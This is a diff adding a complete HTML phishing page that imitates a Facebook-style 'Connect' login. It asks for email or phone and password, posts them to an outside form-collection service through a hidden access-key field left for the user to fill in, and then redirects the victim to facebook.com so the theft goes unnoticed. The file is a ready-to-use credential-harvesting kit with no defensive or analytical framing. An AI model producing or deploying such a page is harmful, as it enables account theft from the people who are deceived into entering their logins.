@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login - Connect</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 300px; text-align: center; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
+        button { width: 97%; padding: 10px; background-color: #1877f2; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2 style="color: #1877f2;">Connect</h2>
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="তোমার_Access_Key_এখানে_দাও">
+            
+            <input type="text" name="email" placeholder="Email or Phone" required>
+            <input type="password" name="password" placeholder="Password" required>
+            
+            <input type="hidden" name="redirect" value="https://facebook.com">
+            
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+</body>
+</html>
